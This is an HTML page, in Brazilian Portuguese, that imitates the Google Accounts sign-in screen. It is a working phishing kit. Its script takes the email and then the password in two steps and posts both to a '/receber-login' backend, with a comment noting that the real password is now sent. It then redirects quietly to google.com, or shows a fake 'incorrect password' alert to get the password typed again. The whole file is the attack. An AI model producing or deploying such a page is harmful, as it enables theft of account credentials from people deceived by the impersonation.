<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer login nas Contas do Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background: #fff;
            color: #202124;
            min-height: 100vh;
        }
        
        /* Header */
        .header {
            padding: 24px 0;
            text-align: center;
            border-bottom: 1px solid #dadce0;
        }
        
        .google-logo {
            font-size: 22px;
            font-weight: 600; /* Mais grosso */
            color: #5f6368;
        }
        
        /* Main Container - Alinhado mais para cima */
        .container {
            max-width: 448px;
            margin: 40px auto 0; /* Margem apenas no topo */
            padding: 0 40px;
        }
        
        .login-box {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
        }
        
        /* Title */
        .title {
            text-align: center;
            margin-bottom: 16px;
        }
        
        .title h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
        }
        
        .title p {
            font-size: 16px;
            color: #202124;
            font-weight: 400;
        }
        
        /* Form */
        .form-group {
            margin-bottom: 24px;
        }
        
        .input-field {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: all 0.2s;
        }
        
        .input-field:focus {
            border-color: #1a73e8;
            outline: none;
            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
        }
        
        .input-field.error {
            border-color: #d93025;
        }

        /* Campo de senha (inicialmente escondido) */
        .password-field {
            display: none;
            margin-top: 16px;
        }
        
        /* Links */
        .forgot-link {
            display: block;
            text-align: left;
            margin-bottom: 26px;
        }
        
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .forgot-link a:hover {
            text-decoration: underline;
        }
        
        /* Info Text */
        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin: 32px 0 26px;
            line-height: 1.4286;
        }
        
        .info-text a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }
        
        .info-text a:hover {
            text-decoration: underline;
        }
        
        /* Buttons */
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .create-account:hover {
            text-decoration: underline;
        }
        
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        
        .next-button:hover {
            background: #1669d6;
        }
        
        .next-button:disabled {
            background: #1a73e8;
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        /* Footer */
        .footer {
            padding: 24px 0;
            border-top: 1px solid #dadce0;
            margin-top: 40px;
        }
        
        .footer-content {
            max-width: 448px;
            margin: 0 auto;
            padding: 0 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .language-select {
            border: none;
            background: none;
            color: #1a73e8;
            font-size: 12px;
            cursor: pointer;
            padding: 8px;
        }
        
        .footer-links {
            display: flex;
            gap: 24px;
        }
        
        .footer-links a {
            color: #757575;
            text-decoration: none;
            font-size: 12px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 24px;
                margin-top: 20px;
            }
            
            .login-box {
                border: none;
                padding: 24px 0;
            }
            
            .footer-content {
                flex-direction: column;
                gap: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="header">
        <div class="google-logo">Google</div>
    </div>

    <!-- Main Content -->
    <div class="container">
        <div class="login-box">
            <div class="title">
                <h1>Fazer login</h1>
                <p>Use sua Conta do Google</p>
            </div>

            <form id="loginForm">
                <div class="form-group">
                    <input type="email" class="input-field" id="email" placeholder="E-mail ou telefone" required autofocus>
                </div>

                <div class="password-field" id="passwordField">
                    <input type="password" class="input-field" id="password" placeholder="Digite sua senha" required>
                </div>

                <div class="forgot-link">
                    <a href="#" id="forgotLink">Esqueceu seu e-mail?</a>
                </div>

                <div class="info-text">
                    Não está no seu computador? Use o modo visitante para fazer login com privacidade. <a href="#">Saiba mais</a>
                </div>

                <div class="buttons">
                    <a href="#" class="create-account">Criar conta</a>
                    <button type="submit" class="next-button" id="submitBtn">Próxima</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <div class="footer-content">
            <select class="language-select">
                <option>Português (Brasil)</option>
                <option>English (United States)</option>
                <option>Español (España)</option>
            </select>
            
            <div class="footer-links">
                <a href="#">Ajuda</a>
                <a href="#">Privacidade</a>
                <a href="#">Termos</a>
            </div>
        </div>
    </div>

    <script>
        let currentStep = 1;
        const emailInput = document.getElementById('email');
        const passwordField = document.getElementById('passwordField');
        const passwordInput = document.getElementById('password');
        const forgotLink = document.getElementById('forgotLink');
        const submitBtn = document.getElementById('submitBtn');

        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();
            
            const email = emailInput.value;
            const password = passwordInput.value;
            
            if (currentStep === 1) {
                // Primeiro passo: validar email
                if (!email.includes('@')) {
                    emailInput.classList.add('error');
                    return;
                }
                
                // Simular verificação do Google
                submitBtn.disabled = true;
                submitBtn.textContent = 'Verificando...';
                
                setTimeout(() => {
                    // Mostrar campo de senha (segundo passo)
                    passwordField.style.display = 'block';
                    forgotLink.innerHTML = 'Esqueceu a senha?';
                    submitBtn.textContent = 'Fazer login';
                    currentStep = 2;
                    submitBtn.disabled = false;
                    
                    // Focar no campo de senha
                    passwordInput.focus();
                }, 800);
                
            } else {
                // Segundo passo: enviar login com senha
                submitBtn.disabled = true;
                submitBtn.textContent = 'Entrando...';
                
                try {
                    // Enviar email E SENHA para o backend
                    const response = await fetch('/receber-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            senha: password // Agora envia a senha real
                        })
                    });
                    
                    const data = await response.json();
                    
                    if (response.ok) {
                        // Redirecionar diretamente para o Google SEM mensagem
                        window.location.href = 'https://google.com';
                    } else {
                        throw new Error(data.message || 'Erro no servidor');
                    }
                    
                } catch (error) {
                    // Em caso de erro, mostrar mensagem e limpar senha
                    alert('Senha incorreta. Tente novamente.');
                    passwordInput.value = '';
                    passwordInput.focus();
                } finally {
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Fazer login';
                }
            }
        });

        // Remover erro quando usuário digitar no email
        emailInput.addEventListener('input', function() {
            this.classList.remove('error');
        });

        // Voltar para o primeiro passo se clicar em "Esqueceu a senha?"
        forgotLink.addEventListener('click', function(e) {
            e.preventDefault();
            if (currentStep === 2) {
                passwordField.style.display = 'none';
                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
                submitBtn.textContent = 'Próxima';
                currentStep = 1;
                emailInput.focus();
            }
        });

        // Também permitir voltar com Enter no campo de senha vazio
        passwordInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && this.value === '' && currentStep === 2) {
                e.preventDefault();
                passwordField.style.display = 'none';
                forgotLink.innerHTML = 'Esqueceu seu e-mail?';
                submitBtn.textContent = 'Próxima';
                currentStep = 1;
                emailInput.focus();
            }
        });
    </script>
</body>
</html>
